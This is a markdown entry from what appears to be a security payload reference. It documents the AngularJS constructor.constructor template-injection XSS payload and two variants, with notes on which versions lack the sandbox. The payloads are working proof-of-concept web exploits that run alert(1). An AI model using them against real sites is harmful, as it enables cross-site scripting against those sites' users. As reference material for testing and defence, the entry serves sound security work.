---
title: AngularJS constructor.constructor Chain (v1.0–1.1.5 and v1.6+)
slug: angular-constructor-chain
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/angularjs]
inbound: []
---

# AngularJS constructor.constructor Chain (v1.0–1.1.5 and v1.6+)

## Payload

```javascript
{{constructor.constructor('alert(1)')()}}
```

## Variants

```javascript
{{$on.constructor('alert(1)')()}}
constructor.constructor('alert(1)')()
```

## Context

In AngularJS 1.0.1–1.1.5 (no sandbox) and 1.6+ (sandbox removed), the `constructor.constructor` chain directly reaches the global `Function` constructor from any scope object. `$on` is shorter (uses the event bus function). The third form is the DOM-based / `orderBy` filter variant where the expression is fed through the `orderBy` filter rather than a mustache directly. No user interaction needed; fires on template compilation. The sandbox versions (1.2–1.5) require the version-specific chain instead.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-angular.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [AngularJS Framework Vectors](../../techniques/dom-xss/framework-vectors-angular.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
